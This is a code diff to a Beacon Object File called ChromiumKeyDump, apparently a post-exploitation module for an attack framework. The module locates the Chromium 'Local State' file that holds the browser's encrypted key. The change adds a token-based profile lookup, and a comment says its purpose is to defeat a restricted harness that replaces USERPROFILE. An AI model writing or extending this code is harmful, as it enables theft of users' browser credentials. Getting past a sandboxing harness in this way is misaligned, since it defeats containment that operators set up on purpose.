@@ -3,6 +3,7 @@
 #include <windows.h>
 #include <wincrypt.h>
 #include <shlobj.h>
+#include <userenv.h>
 
 extern "C" {
 #include "beacon.h"
@@ -16,7 +17,10 @@ BOF_REDECLARE(KERNEL32, CreateFileW);
 BOF_REDECLARE(KERNEL32, CloseHandle);
 BOF_REDECLARE(KERNEL32, GetFileSizeEx);
 BOF_REDECLARE(KERNEL32, GetLastError);
+BOF_REDECLARE(KERNEL32, GetCurrentProcess);
 BOF_REDECLARE(KERNEL32, LocalFree);
+BOF_REDECLARE(ADVAPI32, OpenProcessToken);
+BOF_REDECLARE(USERENV, GetUserProfileDirectoryW);
 BOF_REDECLARE(OLE32, CoInitializeEx);
 BOF_REDECLARE(OLE32, CoUninitialize);
 BOF_REDECLARE(OLE32, CoTaskMemFree);
@@ -33,7 +37,10 @@ BOF_REDECLARE(MSVCRT, free);
     BOF_LOCAL(KERNEL32, CloseHandle); \
     BOF_LOCAL(KERNEL32, GetFileSizeEx); \
     BOF_LOCAL(KERNEL32, GetLastError); \
+    BOF_LOCAL(KERNEL32, GetCurrentProcess); \
     BOF_LOCAL(KERNEL32, LocalFree); \
+    BOF_LOCAL(ADVAPI32, OpenProcessToken); \
+    BOF_LOCAL(USERENV, GetUserProfileDirectoryW); \
     BOF_LOCAL(OLE32, CoInitializeEx); \
     BOF_LOCAL(OLE32, CoUninitialize); \
     BOF_LOCAL(OLE32, CoTaskMemFree); \
@@ -72,28 +79,54 @@ extern "C" void go(char* args, int alen) {
     const bool shouldUninitialize = SUCCEEDED(comResult);
 
     PWSTR appData = NULL;
+    WCHAR fallbackAppData[MAX_PATH];
+    const WCHAR* basePath = NULL;
     const GUID localAppData = {0xF1B32785, 0x6FBA, 0x4FCF, {0x9D, 0x55, 0x7B, 0x8E, 0x7F, 0x15, 0x70, 0x91}};
     HRESULT result = SHGetKnownFolderPath(localAppData, 0, NULL, &appData);
-    if (FAILED(result) || appData == NULL) {
-        if (shouldUninitialize) CoUninitialize();
-        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] SHGetKnownFolderPath failed hresult=%08x\n", result);
-        return;
+    if (SUCCEEDED(result) && appData != NULL) {
+        basePath = appData;
+    } else {
+        // A restricted BOF harness can replace USERPROFILE without changing the
+        // process token. Resolve the account's real profile in that case.
+        HANDLE token = NULL;
+        DWORD capacity = MAX_PATH;
+        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
+            if (GetUserProfileDirectoryW(token, fallbackAppData, &capacity)) {
+                size_t profileLength = 0;
+                while (profileLength < MAX_PATH && fallbackAppData[profileLength] != L'\0') ++profileLength;
+                const WCHAR localSuffix[] = L"\\AppData\\Local";
+                const size_t localSuffixLength = sizeof(localSuffix) / sizeof(WCHAR) - 1;
+                if (profileLength + localSuffixLength < MAX_PATH) {
+                    for (size_t i = 0; i <= localSuffixLength; ++i) {
+                        fallbackAppData[profileLength + i] = localSuffix[i];
+                    }
+                    basePath = fallbackAppData;
+                }
+            }
+            CloseHandle(token);
+        }
+        if (basePath == NULL) {
+            if (appData != NULL) CoTaskMemFree(appData);
+            if (shouldUninitialize) CoUninitialize();
+            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] LocalAppData lookup failed hresult=%08x\n", result);
+            return;
+        }
     }
 
     WCHAR widePath[MAX_PATH];
     size_t baseLength = 0;
-    while (baseLength < MAX_PATH && appData[baseLength] != L'\0') ++baseLength;
+    while (baseLength < MAX_PATH && basePath[baseLength] != L'\0') ++baseLength;
     size_t suffixLength = 0;
     while (suffix[suffixLength] != L'\0') ++suffixLength;
     if (baseLength + suffixLength >= MAX_PATH) {
-        CoTaskMemFree(appData);
+        if (appData != NULL) CoTaskMemFree(appData);
         if (shouldUninitialize) CoUninitialize();
         BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Local State path is too long\n");
         return;
     }
-    for (size_t i = 0; i < baseLength; ++i) widePath[i] = appData[i];
+    for (size_t i = 0; i < baseLength; ++i) widePath[i] = basePath[i];
     for (size_t i = 0; i <= suffixLength; ++i) widePath[baseLength + i] = suffix[i];
-    CoTaskMemFree(appData);
+    if (appData != NULL) CoTaskMemFree(appData);
     if (shouldUninitialize) CoUninitialize();
 
     BeaconPrintf(CALLBACK_OUTPUT, "[ChromiumKeyDump] Target File: %S\n", widePath);
